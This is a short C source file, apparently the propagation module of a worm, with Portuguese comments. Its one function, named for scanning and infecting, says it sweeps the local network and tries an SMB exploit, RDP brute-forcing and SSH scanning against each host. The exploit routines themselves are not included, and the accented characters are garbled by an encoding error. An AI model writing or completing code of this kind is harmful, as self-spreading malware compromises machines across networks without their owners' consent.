// propagation.c â€“ Gerencia a propagaÃ§Ã£o para outros hosts
#include "propagation.h"
#include "smb_exploit.h"
#include "rdp_bruteforce.h"
#include "ssh_scanner.h"

void Propagation_ScanAndInfect() {
    // Escaneia rede local
    // Para cada host vulnerÃ¡vel, tenta mÃ©todos em ordem
    SMB_TryExploit();
    RDP_BruteForce();
    SSH_Scan();
}
